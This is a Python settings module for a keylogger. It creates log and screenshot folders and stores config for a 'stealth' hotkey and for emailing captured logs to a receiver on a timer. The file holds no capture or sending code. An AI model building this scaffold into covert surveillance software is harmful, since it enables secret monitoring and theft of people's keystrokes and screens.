import json
import os

class Settings:
    def __init__(self):
        self.config_file = "keylogger_config.json"
        self.defaults = {
            "log_folder": "logs",
            "screenshot_folder": "screenshots",
            "email_config": {"enabled": False, "email": "", "password": "", "receiver": "", "interval": 300},
            "hotkeys": {"stealth": "f12", "pause": "f11"},
            "log_interval": 30
        }
        self.load()

    def load(self):
        if os.path.exists(self.config_file):
            with open(self.config_file, "r") as f:
                self.config = json.load(f)
        else:
            self.config = self.defaults
            self.save()
        os.makedirs(self.config["log_folder"], exist_ok=True)
        os.makedirs(self.config["screenshot_folder"], exist_ok=True)

    def save(self):
        with open(self.config_file, "w") as f:
            json.dump(self.config, f, indent=4)